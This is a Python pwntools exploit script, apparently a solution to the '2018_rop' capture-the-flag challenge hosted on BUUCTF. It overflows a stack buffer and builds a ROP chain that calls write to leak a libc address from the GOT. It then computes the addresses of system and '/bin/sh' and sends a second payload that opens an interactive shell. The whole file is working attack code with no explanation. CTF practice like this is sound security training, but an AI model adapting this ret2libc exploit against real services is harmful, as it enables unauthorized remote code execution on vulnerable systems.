from pwn import *

context.log_level = 'debug'
io = remote('node4.buuoj.cn', 29453)
# io = process('2018_rop')
libc = ELF('libc-2.27.so')
elf = ELF('2018_rop')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_got = elf.got['read']
getegid_got = elf.got['getegid']
ppp_ret = 0x0804855d

payload = cyclic(0x8c) + p32(write_plt) + p32(ppp_ret) + p32(1) + p32(read_got) + p32(4) + p32(main_addr)
io.sendline(payload)
libc_base = u32(io.recvn(4)) - libc.symbols['read']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x8c) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendline(payload)
io.interactive()

